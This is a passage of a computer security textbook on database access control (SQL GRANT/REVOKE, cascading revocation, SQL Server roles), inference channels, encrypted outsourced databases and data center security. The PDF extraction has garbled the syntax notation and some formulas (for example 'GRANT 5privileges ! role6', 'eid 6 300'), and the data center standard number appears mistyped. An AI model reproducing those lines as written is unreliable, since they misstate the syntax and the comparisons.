table.\\r\\n• Decentralized administration: In addition to granting and revoking access \\r\\nrights to a table, the owner of the table may grant and revoke authorization \\r\\nrights to other users, allowing them to grant and revoke access rights to the \\r\\ntable.\\r\\nAs with any access control system, a database access control system distin\\ufffeguishes different access rights, including create, insert, delete, update, read, and write. \\r\\nSome DBMSs provide considerable control over the granularity of access rights. \\r\\nAccess rights can be to the entire database, to individual tables, or to selected rows \\r\\nor columns within a table. Access rights can be determined based on the contents \\r\\nof a table entry. For example, in a personnel database, some users may be limited to \\r\\nseeing salary information only up to a certain maximum value. And a department \\r\\nmanager may only be allowed to view salary information for employees in his or her \\r\\ndepartment.\\r\\nM05_STAL0611_04_GE_C05.indd 183 10/11/17 2:49 PM\\n\\n\\n184 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nSQL-Based Access Definition\\r\\nSQL provides two commands for managing access rights, GRANT and REVOKE. \\r\\nFor different versions of SQL, the syntax is slightly different. In general terms, the \\r\\nGRANT command has the following syntax:1\\r\\nGRANT 5privileges ! role6\\r\\n[ON table]\\r\\nTO 5user ! role ! PUBLIC6\\r\\n[IDENTIFIED BY password]\\r\\n[WITH GRANT OPTION]\\r\\nThis command can be used to grant one or more access rights or can be used \\r\\nto assign a user to a role. For access rights, the command can optionally specify that it \\r\\napplies only to a specified table. The TO clause specifies the user or role to which the \\r\\nrights are granted. A PUBLIC value indicates that any user has the specified access rights. \\r\\nThe optional IDENTIFIED BY clause specifies a password that must be used to revoke \\r\\nthe access rights of this GRANT command. The GRANT OPTION indicates that the \\r\\ngrantee can grant this access right to other users, with or without the grant option.\\r\\nAs a simple example, consider the following statement:\\r\\nGRANT SELECT ON ANY TABLE TO ricflair\\r\\nThis statement enables the user ricflair to query any table in the database.\\r\\nDifferent implementations of SQL provide different ranges of access rights. The \\r\\nfollowing is a typical list:\\r\\n• Select: Grantee may read entire database; individual tables; or specific columns \\r\\nin a table.\\r\\n• Insert: Grantee may insert rows in a table; or insert rows with values for specific \\r\\ncolumns in a table.\\r\\n• Update: Semantics is similar to INSERT.\\r\\n• Delete: Grantee may delete rows from a table.\\r\\n• References: Grantee is allowed to define foreign keys in another table that refer \\r\\nto the specified columns.\\r\\nThe REVOKE command has the following syntax:\\r\\nREVOKE 5privileges ! role6\\r\\n[ON table]\\r\\nFROM 5user ! role ! PUBLIC6\\r\\n1\\r\\nThe following syntax definition conventions are used. Elements separated by a vertical line are alterna\\ufffetives. A list of alternatives is grouped in curly brackets. Square brackets enclose optional elements. That is, \\r\\nthe elements inside the square brackets may or may not be present.\\r\\nM05_STAL0611_04_GE_C05.indd 184 10/11/17 2:49 PM\\n\\n\\n5.5 / DATABASE ACCESS CONTROL 185\\r\\nThus, the following statement revokes the access rights of the preceding example:\\r\\nREVOKE SELECT ON ANY TABLE FROM ricflair\\r\\nCascading Authorizations\\r\\nThe grant option enables an access right to cascade through a number of users. We \\r\\nconsider a specific access right and illustrate the cascade phenomenon in Figure 5.6. \\r\\nThe figure indicates that Ann grants the access right to Bob at time t = 10 and to \\r\\nChris at time t = 20. Assume the grant option is always used. Thus, Bob is able to \\r\\ngrant the access right to David at t = 30. Chris redundantly grants the access right \\r\\nto David at t = 50. Meanwhile, David grants the right to Ellen, who in turn grants it \\r\\nto Jim; and subsequently David grants the right to Frank.\\r\\nJust as the granting of privileges cascades from one user to another using the \\r\\ngrant option, the revocation of privileges also cascaded. Thus, if Ann revokes the \\r\\naccess right to Bob and Chris, then the access right is also revoked to David, Ellen, \\r\\nJim, and Frank. A complication arises when a user receives the same access right \\r\\nmultiple times, as happens in the case of David. Suppose Bob revokes the privilege \\r\\nfrom David. David still has the access right because it was granted by Chris at t = 50.\\r\\nHowever, David granted the access right to Ellen after receiving the right, with grant \\r\\noption, from Bob but prior to receiving it from Chris. Most implementations dic\\ufffetate that in this circumstance, the access right to Ellen and therefore Jim is revoked \\r\\nwhen Bob revokes the access right to David. This is because at t = 40, when David \\r\\ngranted the access right to Ellen, David only had the grant option to do this from \\r\\nBob. When Bob revokes the right, this causes all subsequent cascaded grants that are \\r\\ntraceable solely to Bob via David to be revoked. Because David granted the access \\r\\nright to Frank after David was granted the access right with grant option from Chris, \\r\\nthe access right to Frank remains. These effects are shown in the lower portion of \\r\\nFigure 5.6.\\r\\nFigure 5.6 Bob Revokes Privilege from David\\r\\nAnn\\r\\nBob\\r\\nChris\\r\\nDavid Frank\\r\\nEllen Jim t = 70\\r\\nt = 60\\r\\nt = 40\\r\\nt = 30\\r\\nt = 50\\r\\nt = 10\\r\\nt = 20\\r\\nAnn\\r\\nBob\\r\\nChris\\r\\nDavid Frank t = 60\\r\\nt = 50\\r\\nt = 10\\r\\nt = 20\\r\\nM05_STAL0611_04_GE_C05.indd 185 10/11/17 2:49 PM\\n\\n\\n186 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nTo generalize, the convention followed by most implementations is as follows. \\r\\nWhen user A revokes an access right, any cascaded access right is also revoked, unless \\r\\nthat access right would exist even if the original grant from A had never occurred. \\r\\nThis convention was first proposed in [GRIF76].\\r\\nRole-Based Access Control\\r\\nA role-based access control (RBAC) scheme is a natural fit for database access con\\ufffetrol. Unlike a file system associated with a single or a few applications, a database \\r\\nsystem often supports dozens of applications. In such an environment, an individual \\r\\nuser may use a variety of applications to perform a variety of tasks, each of which \\r\\nrequires its own set of privileges. It would be poor administrative practice to simply \\r\\ngrant users all of the access rights they require for all the tasks they perform. RBAC \\r\\nprovides a means of easing the administrative burden and improving security.\\r\\nIn a discretionary access control environment, we can classify database users \\r\\nin to three broad categories:\\r\\n• Application owner: An end user who owns database objects (tables, columns, \\r\\nand rows) as part of an application. That is, the database objects are generated \\r\\nby the application or are prepared for use by the application.\\r\\n• End user other than application owner: An end user who operates on data\\ufffebase objects via a particular application but does not own any of the database \\r\\nobjects.\\r\\n• Administrator: User who has administrative responsibility for part or all of the \\r\\ndatabase.\\r\\nWe can make some general statements about RBAC concerning these three \\r\\ntypes of users. An application has associated with it a number of tasks, with each \\r\\ntask requiring specific access rights to portions of the database. For each task, one \\r\\nor more roles can be defined that specify the needed access rights. The application \\r\\nowner may assign roles to end users. Administrators are responsible for more sensi\\ufffetive or general roles, including those having to do with managing physical and logical \\r\\ndatabase components, such as data files, users, and security mechanisms. The system \\r\\nneeds to be set up to give certain administrators certain privileges. Administrators in \\r\\nturn can assign users to administrative-related roles.\\r\\nA database RBAC facility needs to provide the following capabilities:\\r\\n• Create and delete roles.\\r\\n• Define permissions for a role.\\r\\n• Assign and cancel assignment of users to roles.\\r\\nA good example of the use of roles in database security is the RBAC facility \\r\\nprovided by Microsoft SQL Server. SQL Server supports three types of roles: Server \\r\\nroles, database roles, and user-defined roles. The first two types of roles are referred \\r\\nto as fixed roles (see Table 5.2); these are preconfigured for a system with specific \\r\\naccess rights. The administrator or user cannot add, delete, or modify fixed roles; it is \\r\\nonly possible to add and remove users as members of a fixed role.\\r\\nFixed server roles are defined at the server level and exist independently of \\r\\nany user database. They are designed to ease the administrative task. These roles \\r\\nM05_STAL0611_04_GE_C05.indd 186 10/11/17 2:49 PM\\n\\n\\n5.5 / DATABASE ACCESS CONTROL 187\\r\\nhave different permissions and are intended to provide the ability to spread the \\r\\nadministrative responsibilities without having to give out complete control. Database \\r\\nadministrators can use these fixed server roles to assign different administrative tasks \\r\\nto personnel and give them only the rights they absolutely need.\\r\\nFixed database roles operate at the level of an individual database. As with \\r\\nfixed server roles, some of the fixed database roles, such as db_accessadmin and db_\\r\\nsecurityadmin, are designed to assist a DBA with delegating administrative respon\\ufffesibilities. Others, such as db_datareader and db_datawriter, are designed to provide \\r\\nblanket permissions for an end user.\\r\\nSQL Server allows users to create roles. These user-defined roles can then be \\r\\nassigned access rights to portions of the database. A user with proper authorization \\r\\n(typically, a user assigned to the db_securityadmin role) may define a new role and \\r\\nassociate access rights with the role. There are two types of user-defined roles: Stan\\ufffedard and application. For a standard role, an authorized user can assign other users \\r\\nto the role. An application role is associated with an application rather than with a \\r\\ngroup of users and requires a password. The role is activated when an application \\r\\nexecutes the appropriate code. A user who has access to the application can use the \\r\\napplication role for database access. Often, database applications enforce their own \\r\\nsecurity based on the application logic. For example, you can use an application role \\r\\nRole Permissions\\r\\nFixed Server Roles\\r\\nsysadmin Can perform any activity in SQL Server and have complete control over all \\r\\ndatabase functions\\r\\nserveradmin Can set server-wide configuration options and shut down the server\\r\\nsetupadmin Can manage linked servers and startup procedures\\r\\nsecurityadmin Can manage logins and CREATE DATABASE permissions, also read error \\r\\nlogs and change passwords\\r\\nprocessadmin Can manage processes running in SQL Server\\r\\nDbcreator Can create, alter, and drop databases\\r\\ndiskadmin Can manage disk files\\r\\nbulkadmin Can execute BULK INSERT statements\\r\\nFixed Database Roles\\r\\ndb_owner Has all permissions in the database\\r\\ndb_accessadmin Can add or remove user IDs\\r\\ndb_datareader Can select all data from any user table in the database\\r\\ndb_datawriter Can modify any data in any user table in the database\\r\\ndb_ddladmin Can issue all data definition language statements\\r\\ndb_securityadmin Can manage all permissions, object ownerships, roles and role memberships\\r\\ndb_backupoperator Can issue DBCC, CHECKPOINT, and BACKUP statements\\r\\ndb_denydatareader Can deny permission to select data in the database\\r\\ndb_denydatawriter Can deny permission to change data in the database\\r\\nTable 5.2 Fixed Roles in Microsoft SQL Server\\r\\nM05_STAL0611_04_GE_C05.indd 187 10/11/17 2:49 PM\\r\\nhttps://sanet.st/blogs/polatebooks\\n\\n\\n188 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nwith its own password to allow the particular user to obtain and modify any data \\r\\nonly during specific hours. Thus, you can realize more complex security management \\r\\nwithin the application logic.\\r\\n5.6 INFERENCE\\r\\nInference, as it relates to database security, is the process of performing authorized \\r\\nqueries and deducing unauthorized information from the legitimate responses \\r\\nreceived. The inference problem arises when the combination of a number of data \\r\\nitems is more sensitive than the individual items, or when a combination of data items \\r\\ncan be used to infer data of higher sensitivity. Figure 5.7 illustrates the process. The \\r\\nattacker may make use of nonsensitive data as well as metadata. Metadata refers to \\r\\nknowledge about correlations or dependencies among data items that can be used to \\r\\ndeduce information not otherwise available to a particular user. The information trans\\ufffefer path by which unauthorized data is obtained is referred to as an inference channel.\\r\\nIn general terms, two inference techniques can be used to derive additional \\r\\ninformation: Analyzing functional dependencies between attributes within a table \\r\\nor across tables, and merging views with the same constraints.\\r\\nAn example of the latter, shown in Figure 5.8, illustrates the inference prob\\ufffelem. Figure 5.8a shows an Inventory table with four columns. Figure 5.8b shows two \\r\\nviews, defined in SQL as follows:\\r\\nCREATE view V1 AS CREATE view V2 AS\\r\\nSELECT Availability, Cost SELECT Item, Department\\r\\nFROM Inventory FROM Inventory\\r\\nWHERE Department = “hardware” WHERE Department = “hardware”\\r\\nFigure 5.7 Indirect Information Access via Inference Channel\\r\\nSensitive\\r\\ndata\\r\\nMetadata\\r\\nAuthorized\\r\\naccess Unauthorized\\r\\naccess\\r\\nInference\\r\\nAccess control\\r\\nNon\\r\\nsensitive\\r\\ndata\\r\\nM05_STAL0611_04_GE_C05.indd 188 10/11/17 2:49 PM\\n\\n\\n5.6 / INFERENCE 189\\r\\nUsers of these views are not authorized to access the relationship between Item \\r\\nand Cost. A user who has access to either or both views cannot infer the relationship \\r\\nby functional dependencies. That is, there is not a functional relationship between \\r\\nItem and Cost such that knowing Item and perhaps other information is sufficient to \\r\\ndeduce Cost. However, suppose the two views are created with the access constraint \\r\\nthat Item and Cost cannot be accessed together. A user who knows the structure \\r\\nof the Inventory table and who knows that the view tables maintain the same row \\r\\norder as the Inventory table is then able to merge the two views to construct the table \\r\\nshown in Figure 5.8c. This violates the access control policy that the relationship of \\r\\nattributes Item and Cost must not be disclosed.\\r\\nIn general terms, there are two approaches to dealing with the threat of disclo\\ufffesure by inference:\\r\\n• Inference detection during database design: This approach removes an infer\\ufffeence channel by altering the database structure or by changing the access con\\ufffetrol regime to prevent inference. Examples include removing data dependencies \\r\\nby splitting a table into multiple tables or using more fine-grained access control \\r\\nroles in an RBAC scheme. Techniques in this category often result in unneces\\ufffesarily stricter access controls that reduce availability.\\r\\n• Inference detection at query time: This approach seeks to eliminate an infer\\ufffeence channel violation during a query or series of queries. If an inference chan\\ufffenel is detected, the query is denied or altered.\\r\\nFigure 5.8 Inference Example\\r\\nItem Availability Cost ($) Department\\r\\nRolling pin\\r\\nShower/tub cleaner\\r\\nCake pan\\r\\nDecorative chain\\r\\nLid support\\r\\nShelf support in-store/online hardware\\r\\nhardware\\r\\nhardware\\r\\nhousewares\\r\\nhousewares\\r\\nhousewares\\r\\n7.99\\r\\n5.49\\r\\n104.99\\r\\n12.99\\r\\n11.99\\r\\n10.99\\r\\nin-store/online\\r\\nin-store/online\\r\\nin-store/online\\r\\nonline only\\r\\nonline only\\r\\n(a) Inventory table\\r\\nItem Department\\r\\nDecorative chain\\r\\nLid support\\r\\nShelf support hardware\\r\\nhardware\\r\\nhardware\\r\\nAvailability Cost ($)\\r\\nin-store/online 7.99\\r\\n5.49\\r\\nin-store/online 104.99\\r\\nonline only\\r\\n(b) Two views\\r\\nItem Department\\r\\nDecorative chain\\r\\nLid support\\r\\nShelf support hardware\\r\\nhardware\\r\\nhardware\\r\\nAvailability Cost ($)\\r\\nin-store/online 7.99\\r\\n5.49\\r\\nin-store/online 104.99\\r\\nonline only\\r\\n(c) Table derived from combining query answers\\r\\nM05_STAL0611_04_GE_C05.indd 189 10/11/17 2:49 PM\\n\\n\\n190 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nFor either of the preceding approaches, some inference detection algorithm is \\r\\nneeded. This is a difficult problem and the subject of ongoing research. To give some \\r\\nappreciation of the difficulty, we present an example taken from [LUNT89]. Consider \\r\\na database containing personnel information, including names, addresses, and salaries \\r\\nof employees. Individually, the name, address, and salary information is available to a \\r\\nsubordinate role, such as Clerk, but the association of names and salaries is restricted \\r\\nto a superior role, such as Administrator. This is similar to the problem illustrated in \\r\\nFigure 5.8. One solution to this problem is to construct three tables, which include \\r\\nthe following information:\\r\\nEmployees (Emp#, Name, Address)\\r\\nSalaries (S#, Salary)\\r\\nEmp-Salary (Emp#, S#)\\r\\nwhere each line consists of the table name followed by a list of column names for that table. \\r\\nIn this case, each employee is assigned a unique employee number (Emp#) and a unique \\r\\nsalary number (S#). The Employees table and the Salaries table are accessible to the Clerk \\r\\nrole, but the Emp-Salary table is only available to the Administrator role. In this structure, \\r\\nthe sensitive relationship between employees and salaries is protected from users assigned \\r\\nthe Clerk role. Now, suppose we want to add a new attribute, employee start date, which \\r\\nis not sensitive. This could be added to the Salaries table as follows:\\r\\nEmployees (Emp#, Name, Address)\\r\\nSalaries (S#, Salary, Start-Date)\\r\\nEmp-Salary (Emp#, S#)\\r\\nHowever, an employee’s start date is an easily observable or discoverable attri\\ufffebute of an employee. Thus, a user in the Clerk role should be able to infer (or par\\ufffetially infer) the employee’s name. This would compromise the relationship between \\r\\nemployee and salary. A straightforward way to remove the inference channel is to \\r\\nadd the start-date column to the Employees table rather than to the Salaries table.\\r\\nThe first security problem indicated in this sample, that it was possible to infer the \\r\\nrelationship between employee and salary, can be detected through analysis of the data \\r\\nstructures and security constraints that are available to the DBMS. However, the sec\\ufffeond security problem, in which the start-date column was added to the Salaries table, \\r\\ncannot be detected using only the information stored in the database. In particular, the \\r\\ndatabase does not indicate that the employee name can be inferred from the start date.\\r\\nIn the general case of a relational database, inference detection is a complex \\r\\nand difficult problem. For multilevel secure databases, to be discussed in Chapter 27, \\r\\nand statistical databases, to be discussed in the next section, progress has been made \\r\\nin devising specific inference detection techniques.\\r\\n5.7 DATABASE ENCRYPTION\\r\\nThe database is typically the most valuable information resource for any organi\\ufffezation and is therefore protected by multiple layers of security, including firewalls, \\r\\nauthentication mechanisms, general access control systems, and database access \\r\\nM05_STAL0611_04_GE_C05.indd 190 10/11/17 2:49 PM\\n\\n\\n5.7 / DATABASE ENCRYPTION 191\\r\\ncontrol systems. In addition, for particularly sensitive data, database encryption is \\r\\nwarranted and often implemented. Encryption becomes the last line of defense in \\r\\ndatabase security.\\r\\nThere are two disadvantages to database encryption:\\r\\n• Key management: Authorized users must have access to the decryption key \\r\\nfor the data for which they have access. Because a database is typically acces\\ufffesible to a wide range of users and a number of applications, providing secure \\r\\nkeys to selected parts of the database to authorized users and applications is a \\r\\ncomplex task.\\r\\n• Inflexibility: When part or all of the database is encrypted, it becomes more \\r\\ndifficult to perform record searching.\\r\\nEncryption can be applied to the entire database, at the record level (encrypt \\r\\nselected records), at the attribute level (encrypt selected columns), or at the level of \\r\\nthe individual field.\\r\\nA number of approaches have been taken to database encryption. In this \\r\\nsection, we look at a representative approach for a multiuser database.\\r\\nA DBMS is a complex collection of hardware and software. It requires a large \\r\\nstorage capacity and requires skilled personnel to perform maintenance, disaster \\r\\nprotection, update, and security. For many small and medium-sized organizations, an \\r\\nattractive solution is to outsource the DBMS and the database to a service provider. \\r\\nThe service provider maintains the database off-site and can provide high availability, \\r\\ndisaster prevention, and efficient access and update. The main concern with such a \\r\\nsolution is the confidentiality of the data.\\r\\nA straightforward solution to the security problem in this context is to encrypt the \\r\\nentire database and not provide the encryption/decryption keys to the service provider. \\r\\nThis solution by itself is inflexible. The user has little ability to access individual data \\r\\nitems based on searches or indexing on key parameters, but rather would have to down\\ufffeload entire tables from the database, decrypt the tables, and work with the results. To pro\\ufffevide more flexibility, it must be possible to work with the database in its encrypted form.\\r\\nAn example of such an approach, depicted in Figure 5.9, is reported in [DAMI05] \\r\\nand [DAMI03]. A similar approach is described in [HACI02]. Four entities are \\r\\ninvolved:\\r\\n• Data owner: An organization that produces data to be made available for con\\ufffetrolled release, either within the organization or to external users.\\r\\n• User: Human entity that presents requests (queries) to the system. The user \\r\\ncould be an employee of the organization who is granted access to the database \\r\\nvia the server, or a user external to the organization who, after authentication, \\r\\nis granted access.\\r\\n• Client: Front end that transforms user queries into queries on the encrypted \\r\\ndata stored on the server.\\r\\n• Server: An organization that receives the encrypted data from a data owner \\r\\nand makes them available for distribution to clients. The server could in fact be \\r\\nowned by the data owner but, more typically, is a facility owned and maintained \\r\\nby an external provider.\\r\\nM05_STAL0611_04_GE_C05.indd 191 10/11/17 2:49 PM\\n\\n\\n192 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nLet us first examine the simplest possible arrangement based on this scenario. \\r\\nSuppose each individual item in the database is encrypted separately, all using the \\r\\nsame encryption key. The encrypted database is stored at the server, but the server \\r\\ndoes not have the key, so the data are secure at the server. Even if someone were \\r\\nable to hack into the server’s system, all he or she would have access to is encrypted \\r\\ndata. The client system does have a copy of the encryption key. A user at the client \\r\\ncan retrieve a record from the database with the following sequence:\\r\\n1. The user issues an SQL query for fields from one or more records with a specific \\r\\nvalue of the primary key.\\r\\n2. The query processor at the client encrypts the primary key, modifies the SQL \\r\\nquery accordingly, and transmits the query to the server.\\r\\n3. The server processes the query using the encrypted value of the primary key and \\r\\nreturns the appropriate record or records.\\r\\n4. The query processor decrypts the data and returns the results.\\r\\nFor example, consider this query, which was introduced in Section 5.1, on the \\r\\ndatabase of Figure 5.4a:\\r\\nSELECT Ename, Eid, Ephone\\r\\n FROM Employee\\r\\n WHERE Did = 15\\r\\nAssume the encryption key k is used and the encrypted value of the department \\r\\nid 15 is E(k, 15) = 1000110111001110. Then, the query processor at the client could \\r\\ntransform the preceding query into\\r\\nFigure 5.9 A Database Encryption Scheme\\r\\nQuery\\r\\nprocessor\\r\\n1. Original query\\r\\nmetadata\\r\\n4. Plaintext\\r\\nresult\\r\\n2. Transformed\\r\\nquery\\r\\n3. Encrypted\\r\\nresult\\r\\nClient\\r\\nUser\\r\\nData owner\\r\\nServer\\r\\nEncrypt/\\r\\ndecrypt\\r\\nQuery\\r\\nexecutor\\r\\nMeta\\ufffedata\\r\\nMeta\\ufffedata\\r\\nEncrypted\\r\\ndatabase\\r\\nData\\ufffebase\\r\\nM05_STAL0611_04_GE_C05.indd 192 10/11/17 2:49 PM\\n\\n\\n5.7 / DATABASE ENCRYPTION 193\\r\\nSELECT Ename, Eid, Ephone\\r\\n FROM Employee\\r\\n WHERE Did = 1000110111001110\\r\\nThis method is certainly straightforward but, as was mentioned, lacks flexibility. \\r\\nFor example, suppose the Employee table contains a salary attribute and the user \\r\\nwishes to retrieve all records for salaries less than $70K. There is no obvious way to \\r\\ndo this, because the attribute value for salary in each record is encrypted. The set \\r\\nof encrypted values do not preserve the ordering of values in the original attribute.\\r\\nTo provide more flexibility, the following approach is taken. Each record (row) \\r\\nof a table in the database is encrypted as a block. Referring to the abstract model \\r\\nof a relational database in Figure 5.3, each row Ri\\r\\n is treated as a contiguous block \\r\\nBi = (xi1 } xi2 }c} xiM). Thus, each attribute value in Ri\\r\\n, regardless of whether it \\r\\nis text or numeric, is treated as a sequence of bits, and all of the attribute values \\r\\nfor that row are concatenated together to form a single binary block. The entire \\r\\nrow is encrypted, expressed as E(k, Bi\\r\\n) = E(k, (xi1 } xi2 }c} xiM)). To assist in data \\r\\nretrieval, attribute indexes are associated with each table. For some or all of the \\r\\nattributes an index value is created. For each row Ri\\r\\n of the unencrypted database, the \\r\\nmapping is as follows (see Figure 5.10):\\r\\n(xi1, xi2, c , xiM) S [E(k, Bi\\r\\n), Ii1, Ii2, c , IiM]\\r\\nFor each row in the original database, there is one row in the encrypted data\\ufffebase. The index values are provided to assist in data retrieval. We can proceed as \\r\\nfollows. For any attribute, the range of attribute values is divided into a set of non\\ufffeoverlapping partitions that encompass all possible values, and an index value is \\r\\nassigned to each partition.\\r\\nTable 5.3 provides an example of this mapping. Suppose employee ID (eid) \\r\\nvalues lie in the range [1, 1000]. We can divide these values into five partitions: \\r\\n[1, 200], [201, 400], [401, 600], [601, 800], and [801, 1000]; then assign index values 1, \\r\\n2, 3, 4, and 5, respectively. For a text field, we can derive an index from the first letter \\r\\nof the attribute value. For the attribute ename, let us assign index 1 to values starting \\r\\nwith A or B, index 2 to values starting with C or D, and so on. Similar partitioning \\r\\nschemes can be used for each of the attributes. Table 5.3b shows the resulting table. \\r\\nThe values in the first column represent the encrypted values for each row. The actual \\r\\nvalues depend on the encryption algorithm and the encryption key. The remaining \\r\\nFigure 5.10 Encryption Scheme for Database of Figure 5.3\\r\\nE(k, B1)\\r\\nE(k, Bi\\r\\n)\\r\\nE(k, BN)\\r\\nI1I\\r\\nIi1\\r\\nIN1\\r\\nI1j\\r\\nIij\\r\\nINj\\r\\nI1M\\r\\nIiM\\r\\nINM\\r\\nBi = (xi1 || xi2 || ... || xiM)\\r\\nM05_STAL0611_04_GE_C05.indd 193 10/11/17 2:49 PM\\n\\n\\n194 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\ncolumns show index values for the corresponding attribute values. The mapping func\\ufffetions between attribute values and index values constitute metadata that are stored \\r\\nat the client and data owner locations but not at the server.\\r\\nThis arrangement provides for more efficient data retrieval. Suppose, for \\r\\nexample, a user requests records for all employees with eid 6 300. The query proces\\ufffesor requests all records with I(eid) = 2. These are returned by the server. The query \\r\\nprocessor decrypts all rows returned, discards those that do not match the original \\r\\nquery, and returns the requested unencrypted data to the user.\\r\\nThe indexing scheme just described does provide a certain amount of informa\\ufffetion to an attacker, namely a rough relative ordering of rows by a given attribute. To \\r\\nobscure such information, the ordering of indexes can be randomized. For exam\\ufffeple, the eid values could be partitioned by mapping [1, 200], [201, 400], [401, 600], \\r\\n[601, 800], and [801, 1000] into 2, 3, 5, 1, and 4, respectively. Because the metadata are \\r\\nnot stored at the server, an attacker could not gain this information from the server.\\r\\nOther features may be added to this scheme. To increase the efficiency of access\\ufffeing records by means of the primary key, the system could use the encrypted value of \\r\\nthe primary key attribute values, or a hash value. In either case, the row corresponding \\r\\nto the primary key value could be retrieved individually. Different portions of the \\r\\ndatabase could be encrypted with different keys, so users would only have access to \\r\\nthat portion of the database for which they had the decryption key. This latter scheme \\r\\ncould be incorporated into a role-based access control system.\\r\\n5.8 DATA CENTER SECURITY\\r\\nA data center is an enterprise facility that houses a large number of servers, storage \\r\\ndevices, and network switches and equipment. The number of servers and storage \\r\\ndevices can run into the tens of thousands in a single facility. Examples of uses for \\r\\nTable 5.3 Encrypted Database Example\\r\\n(a) Employee Table\\r\\neid ename salary addr did\\r\\n23 Tom 70K Maple 45\\r\\n860 Mary 60K Main 83\\r\\n320 John 50K River 50\\r\\n875 Jerry 55K Hopewell 92\\r\\n(b) Encrypted Employee Table with Indexes\\r\\nE(k, B) I(eid) I(ename) I(salary) I(addr) I(did)\\r\\n1100110011001011 . . . 1 10 3 7 4\\r\\n0111000111001010 . . . 5 7 2 7 8\\r\\n1100010010001101 . . . 2 5 1 9 5\\r\\n0011010011111101 . . . 5 5 2 4 9\\r\\nM05_STAL0611_04_GE_C05.indd 194 10/11/17 2:49 PM\\n\\n\\n5.8 / DATA CENTER SECURITY 195\\r\\nthese large data centers include cloud service providers, search engines, large scien\\ufffetific research facilities, and IT facilities for large enterprises. A data center generally \\r\\nincludes redundant or backup power supplies, redundant network connections, envi\\uffferonmental controls (e.g., air conditioning and fire suppression), and various security \\r\\ndevices. Large data centers are industrial scale operations using as much electricity \\r\\nas a small town. A data center can occupy one room of a building, one or more floors, \\r\\nor an entire building.\\r\\nData Center Elements\\r\\nFigure 5.11 illustrates key elements of a large data center configuration. Most of the \\r\\nequipment in a large data center is in the form of stacks of servers and storage mod\\ufffeules mounted in open racks or closed cabinets, which are usually placed in single rows \\r\\nforming corridors between them. This allows access to the front and rear of each rack \\r\\nor cabinet. Typically, the individual modules are equipped with 10-Gbps or 40-Gbps \\r\\nEthernet ports to handle the massive traffic to and from these servers. Also typically, \\r\\neach rack has one or two 10, 40 or 100-Gbps Ethernet switches to interconnect all \\r\\nthe servers and provide connectivity to the rest of the facility. The switches are often \\r\\nFigure 5.11 Key Data Center Elements\\r\\nN * 100GbE\\r\\n100GbE\\r\\n10GbE\\r\\n&\\r\\n40GbE\\r\\nEth Switch\\r\\nEth Switch Eth Switch\\r\\nEth Switch\\r\\nAdditional racks\\r\\nServer or\\r\\nstorage rack\\r\\nServer or\\r\\nstorage rack\\r\\nServer or\\r\\nstorage rack\\r\\nRouter/\\r\\nFirewall\\r\\nRouter/\\r\\nFirewall\\r\\nEth Switch Eth Switch\\r\\nInternet or\\r\\nenterprise\\r\\nnetwork\\r\\nInternet or\\r\\nenterprise\\r\\nnetwork\\r\\nM05_STAL0611_04_GE_C05.indd 195 10/11/17 2:49 PM\\n\\n\\n196 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nmounted in the rack and referred to as top-of-rack (ToR) switches. The term ToR has \\r\\nbecome synonymous with server access switch, even if it is not located “top of rack.” \\r\\nVery large data centers, such as cloud providers, require switches operating at 100 \\r\\nGbps to support the interconnection of server racks and to provide adequate capac\\ufffeity for connecting off-site through network interface controllers (NICs) on routers \\r\\nor firewalls.\\r\\nKey elements not shown in Figure 5.11 are cabling and cross connects, which \\r\\nwe can list as follows:\\r\\n• Cross connect: A facility enabling the termination of cables, as well as their \\r\\ninterconnection with other cabling or equipment.\\r\\n• Horizontal cabling: Any cabling that is used to connect a floor’s wiring closet \\r\\nto wall plates in the work areas to provide local area network (LAN) drops \\r\\nfor connecting servers and other digital equipment to the network. The term \\r\\nhorizontal is used because such cabling is typically run along the ceiling or \\r\\nfloor.\\r\\n• Backbone cabling: Run between data center rooms or enclosures and the main \\r\\ncross-connect point of a building.\\r\\nData Center Security Considerations\\r\\nAll of the security threats and countermeasures discussed in this text are relevant \\r\\nin the context of large data centers, and indeed it is in this context that the risks \\r\\nare most acute. Consider that the data center houses massive amounts of data that \\r\\nare:\\r\\n• located in a confined physical space.\\r\\n• interconnected with direct-connect cabling.\\r\\n• accessible through external network connections, so once past the boundary, a \\r\\nthreat is posed to the entire complex.\\r\\n• typically representative of the greatest single asset of the enterprise.\\r\\nThus, data center security is a top priority for any enterprise with a large data \\r\\ncenter. Some of the important threats to consider include the following:\\r\\n• Denial of service\\r\\n• Advanced persistent threats from targeted attacks\\r\\n• Privacy breaches\\r\\n• Application exploits such as SQL injection\\r\\n• Malware\\r\\n• Physical security threats\\r\\nFigure 5.12 highlights important aspects of data center security, represented \\r\\nas a four-layer model. Site security refers primarily to the physical security of the \\r\\nentire site including the building that houses the data center, as well as the use of \\r\\nredundant utilities. Physical security of the data center itself includes barriers to \\r\\nentry, such as a mantrap (a double-door single-person access control space) coupled \\r\\nM05_STAL0611_04_GE_C05.indd 196 10/11/17 2:49 PM\\n\\n\\n5.8 / DATA CENTER SECURITY 197\\r\\nwith authentication techniques for gaining physical access. Physical security can also \\r\\ninclude security personnel, surveillance systems, and other measures which will be \\r\\ndiscussed in Chapter 16. Network security is extremely important in a facility in \\r\\nwhich such a large collection of assets are concentrated in a single place and acces\\ufffesible by external network connections. Typically, a large data center will employ all \\r\\nof the network security techniques discussed in this text. Finally, security of the data \\r\\nitself, as opposed to the systems they reside on, involves techniques discussed in the \\r\\nremainder of this chapter.\\r\\nTIA-492\\r\\nThe Telecommunications Industry Association (TIA) standard TIA-492 (Telecom\\ufffemunications Infrastructure Standard for Data Centers) specifies the minimum require\\ufffements for telecommunications infrastructure of data centers. Topics covered include \\r\\nthe following:\\r\\n• Network architecture\\r\\n• Electrical design\\r\\n• File storage, backup, and archiving\\r\\n• System redundancy\\r\\n• Network access control and security\\r\\n• Database management\\r\\n• Web hosting\\r\\n• Application hosting\\r\\n• Content distribution\\r\\n• Environmental control\\r\\n• Protection against physical hazards (fire, flood, and windstorm)\\r\\n• Power management\\r\\nFigure 5.12 Data Center Security Model\\r\\nSite\\r\\nSecurity\\r\\nSetbacks, Redundant utilities\\r\\nLandscaping, Bufer zones, Crash\\r\\nbarriers, Entry points, 